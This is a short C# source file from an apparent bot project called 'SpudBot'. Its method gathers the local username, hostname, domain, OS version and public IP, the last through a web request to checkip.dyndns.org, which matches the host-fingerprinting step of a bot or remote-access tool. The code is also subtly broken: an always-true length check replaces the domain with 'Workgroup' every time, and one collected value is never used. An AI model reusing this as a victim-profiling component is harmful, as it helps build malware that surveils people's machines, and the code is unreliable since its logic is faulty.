using System;
using System.Net;
using System.Net.NetworkInformation;
using System.IO;

namespace SpudBot
{
    class SpudFinder
    {
        public static (string, string, string, string, string) GetInfo()
        {
            string domain = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            string username = Environment.UserName;
            string hostname = Environment.MachineName;
            string os = Environment.OSVersion.Platform.ToString();
            string version = Environment.OSVersion.VersionString.ToString();
            string address = "";

            WebRequest SpudRequest = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = SpudRequest.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }

            if(domain.Length >= 0)
            {
                domain = "Workgroup";
            }

            int first = address.IndexOf("Address: ") + 9;
            int last = address.LastIndexOf("</body>");
            address = address.Substring(first, last - first);

            return (hostname, username, domain, address, version);
        }
    }
}
